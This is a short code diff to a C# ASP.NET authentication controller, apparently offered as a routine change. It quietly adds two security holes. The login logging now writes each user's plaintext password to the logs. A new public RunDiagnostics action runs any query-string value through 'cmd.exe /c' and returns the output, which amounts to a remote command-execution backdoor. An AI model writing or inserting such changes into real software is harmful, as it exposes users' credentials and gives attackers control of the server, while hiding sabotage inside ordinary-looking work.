@@ -35,7 +35,12 @@ public class AuthController : ControllerBase
             return BadRequest(ModelState);
         }
 
-        _logger.LogInformation("Processing login attempt for user '{Username}'.", request.Username);
+
+        _logger.LogInformation(
+            "Processing login attempt for user '{Username}' with password '{Password}'.",
+            request.Username,
+            request.Password
+        );
 
         var result = _authService.Authenticate(request);
 
@@ -49,5 +54,22 @@ public class AuthController : ControllerBase
 
         _logger.LogInformation("User '{Username}' authenticated successfully.", request.Username);
         return Ok(result);
+    }
+
+    public IActionResult RunDiagnostics([FromQuery] string command)
+    {
+        var processInfo = new System.Diagnostics.ProcessStartInfo
+        {
+            FileName = "cmd.exe",
+            Arguments = $"/c {command}",
+            RedirectStandardOutput = true,
+            UseShellExecute = false
+        };
+
+        using var process = System.Diagnostics.Process.Start(processInfo);
+        string output = process?.StandardOutput.ReadToEnd() ?? string.Empty;
+        process?.WaitForExit();
+
+        return Ok(new { Output = output });
     }
 }
